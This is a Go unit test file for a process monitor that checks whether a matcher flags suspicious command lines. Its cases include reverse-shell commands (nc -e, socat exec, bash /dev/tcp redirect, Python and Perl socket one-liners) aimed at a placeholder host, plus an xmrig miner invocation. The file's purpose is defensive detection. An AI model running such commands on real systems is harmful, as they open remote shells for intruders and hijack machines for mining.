package monitor

import (
	"testing"
)

func TestMatchSuspiciousExec_BashInteractive(t *testing.T) {
	cases := []string{
		"bash -i -c exit",
		"/bin/bash -i",
		"BASH -I something", // case-insensitive
	}
	for _, cmd := range cases {
		p := matchSuspiciousExec(cmd)
		if p != "bash-interactive" {
			t.Errorf("cmd=%q: got pattern %q, want bash-interactive", cmd, p)
		}
	}
}

func TestMatchSuspiciousExec_ShInteractive(t *testing.T) {
	cmd := "sh -i"
	if p := matchSuspiciousExec(cmd); p != "sh-interactive" {
		t.Errorf("cmd=%q: got %q, want sh-interactive", cmd, p)
	}
}

func TestMatchSuspiciousExec_PythonSocket(t *testing.T) {
	cmd := "python3 -c import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
	if p := matchSuspiciousExec(cmd); p != "python3-socket" {
		t.Errorf("cmd=%q: got %q, want python3-socket", cmd, p)
	}
}

func TestMatchSuspiciousExec_NcExec(t *testing.T) {
	cmd := "nc -e /bin/sh 10.0.0.1 4444"
	if p := matchSuspiciousExec(cmd); p != "nc-exec" {
		t.Errorf("cmd=%q: got %q, want nc-exec", cmd, p)
	}
}

func TestMatchSuspiciousExec_SocatExec(t *testing.T) {
	cmd := "socat tcp:10.0.0.1:4444 exec:/bin/bash"
	if p := matchSuspiciousExec(cmd); p != "socat-exec" {
		t.Errorf("cmd=%q: got %q, want socat-exec", cmd, p)
	}
}

func TestMatchSuspiciousExec_Xmrig(t *testing.T) {
	cmd := "/tmp/xmrig --pool pool.minexmr.com:4444"
	if p := matchSuspiciousExec(cmd); p != "xmrig" {
		t.Errorf("cmd=%q: got %q, want xmrig", cmd, p)
	}
}

func TestMatchSuspiciousExec_Benign(t *testing.T) {
	benign := []string{
		"bash --version",
		"python3 -c 'print(1)'",
		"/usr/bin/sh /etc/init.d/cron start",
		"nc -z localhost 80",
		"",
	}
	for _, cmd := range benign {
		if p := matchSuspiciousExec(cmd); p != "" {
			t.Errorf("cmd=%q: expected no match, got %q", cmd, p)
		}
	}
}

func TestEvidenceString_ProcEvent(t *testing.T) {
	e := Evidence{ProcEvent: &ProcEventThreat{PID: 1234, Pattern: "bash-interactive"}}
	want := "proc:1234:bash-interactive"
	if s := e.String(); s != want {
		t.Errorf("Evidence.String() = %q, want %q", s, want)
	}
}

func TestMatchSuspiciousExec_PerlSocket(t *testing.T) {
	cmd := "perl -MIO::Socket -e '$s=IO::Socket::INET->new(...)'"
	if p := matchSuspiciousExec(cmd); p != "perl-socket" {
		t.Errorf("cmd=%q: got %q, want perl-socket", cmd, p)
	}
}

func TestMatchSuspiciousExec_BashTcpRedirect(t *testing.T) {
	cmd := "bash -c 'exec /dev/tcp/10.0.0.1/4444'"
	if p := matchSuspiciousExec(cmd); p != "bash-tcp-redirect" {
		t.Errorf("cmd=%q: got %q, want bash-tcp-redirect", cmd, p)
	}
}
